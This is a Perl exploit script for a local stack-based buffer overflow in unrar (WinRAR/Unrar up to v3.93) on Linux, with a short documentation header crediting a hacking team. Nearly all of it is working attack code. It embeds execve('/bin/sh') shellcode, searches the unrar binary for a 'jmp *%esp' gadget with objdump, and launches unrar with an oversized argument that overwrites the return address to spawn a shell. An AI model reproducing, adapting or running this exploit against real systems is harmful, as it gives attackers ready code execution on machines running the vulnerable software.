#!/usr/bin/perl
=head1	TITLE

Winrar <= v3.93 Local Stack-based Overflow exploit


=head2 DESCRIPTION

This script triggers a buffer overflow attack against Unrar, the linux popular version of WinRar extractor.
It was not developped to bypass non-executing stack patches.
Have phun

=head2 AUTHORS

ZadYree ~~ 3LRVS Team - Low Level Languages Reversing Vxing Security


=head2 Tested ON

Linux Debian 6. May work on FreeBSD.

=head3 THANKS

kmkz
regol
hellpast
Hebiko
m_101
ZadYree

SNCF
The one who sent me that locked .rar
=cut
use 5.010;

# Shellcode: execve("/bin/sh") => http://www.shell-storm.org/shellcode/files/shellcode-752.php
use constant SHELLCODE => 	"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f" .
				"\x73\x68\x68\x2f\x62\x69\x6e\x89" .
				"\xe3\xb0\x0b\xcd\x80";
use constant BUFF => ('-' . ('3lrvs' x 820));
##


$pname = "/usr/bin/unrar";

die "[-]File $pname does not exist!\012" unless (-e $pname);

say "[*]Looking for jmp *%esp gadget...";

for my $line(qx{objdump -D $pname | grep "ff e4"}) {
	$esp = "0" . $1, last if ($line =~ m{([a-f0-9]{7}).+jmp\s{4}\*%esp});
}

say '[+]Jump to $esp found! (0x', $esp, ")\012[+]Now exploiting...";
sleep(1);

my @payload = ($pname, (BUFF . pack("V", hex($esp)) . SHELLCODE . "\012"));

exec(@payload);